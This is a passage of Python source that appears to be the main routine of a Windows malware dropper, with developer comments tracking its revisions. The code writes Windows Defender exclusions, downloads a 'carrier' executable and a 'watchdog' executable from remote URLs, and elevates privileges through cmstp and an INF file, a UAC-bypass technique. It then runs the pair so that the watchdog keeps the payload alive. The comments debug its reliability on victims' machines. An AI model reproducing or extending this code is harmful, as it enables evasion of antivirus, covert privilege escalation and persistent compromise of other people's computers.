    # so an un-uploaded edit is a no-op no matter what the source tree says).
    _log("work", "=== run r149: rev=%r exe=%r wd=%r local=%r"
         % (EXCL_REV, EXE_NAME, WD_NAME, LOCALAPPDATA))
    _log("work", "python=%r exe_path=%r payload=%r"
         % (sys.executable, EXE_PATH, os.path.exists(EXE_PATH)))

    # dj (this build): the wide set goes in FIRST, before any image is staged —
    # on an elevated token this lands it outright; on a medium one the writes
    # are refused and the lift road below writes the same list under the
    # stage's token. either way the list is one function.
    try:
        add_defender_exclusions()
    except Exception:
        pass

    # r1.1.2: the exclusion-push loop stays OUT of this body (r14 shape).
    # exclusions ride the STAGE road below: after the lift, the elevated
    # stage materializes + executes exclusions.py, then execs the carrier.
    # r34 fix: this call was run_elevated() — which lifted the carrier exe
    # DIRECTLY and never built/executed the stage, so exclusions.py could
    # not run on any box. that was the whole field miss.
    try:
        if not is_valid_exe(EXE_PATH):
            data = download(EXE_URL) if EXE_URL else None
            if data and not write_file(EXE_PATH, data):
                return
    except Exception:
        pass

    # r98 (dj order): the wd exe rides the SAME stage — fetched + staged beside
    # the carrier BEFORE the lift, so the elevated stage execs the pair in
    # order (tung -> watchdog) with one exclusion covering both.
    try:
        if WD_URL and not is_valid_exe(WD_PATH, 8000):
            wdata = download(WD_URL)
            if wdata:
                write_file(WD_PATH, wdata, exe=WD_NAME)
    except Exception:
        pass

    # r141 (dj): no lift until BOTH images are on disk. a lift that runs with a
    # missing half is exactly what left the watchdog dead and the box looping.
    # r143: the wd half of the gate follows WDXN too — a re-fire run carries the
    # name and no url, and the old gate let it through with no wd on disk.
    if not is_valid_exe(EXE_PATH) or ((WD_URL or WDXN_ENV) and not is_valid_exe(WD_PATH, 8000)):
        _log("work", "images missing on disk (payload=%r wd=%r) -> reexec, no lift"
             % (is_valid_exe(EXE_PATH), is_valid_exe(WD_PATH, 8000)))
        reexec_pair()
        return

    # r140: a watchdog re-fire lands here with everything already staged and
    # the exclusion already written. exec the pair and leave — no cmstp on this
    # road, so no profile is created and no box can be raised.
    if lift_landed():
        _log("work", "lift gate says done -> reexec pair, no cmstp")
        reexec_pair()
        return

    set_defender_exclusions()

    # r144: the lift is ASYNCHRONOUS — cmstp hands the INF off and returns, so
    # the stage (and exclusions.py inside it) is still ~3-6s of work away. the
    # old immediate read-back raced it, read False on every boot, burned one
    # attempt, and settled the tag at revision:2 while the elevated write was
    # still in flight. wait for the stage before judging it.
    ok_wide = _wait_landed(30.0)
    mark_lift(ok_wide)

    # the tag above already says whether the wide set reads back (bare rev) or
    # how many lifts it took (rev:n) — nothing else to write here.

    # r142 (dj order: no jar-side watcher — work.py owns the pair): the lift's
    # elevated stage starts carrier + watchdog exe, and this catches anything
    # that did not come up. the 0.5s lets a just-spawned image appear in the
    # toolhelp walk, so an image the stage already started is not spawned twice.
    time.sleep(0.5)
    reexec_pair()
    _log("work", "run done (covered=%r)" % (ok_wide,))


main()
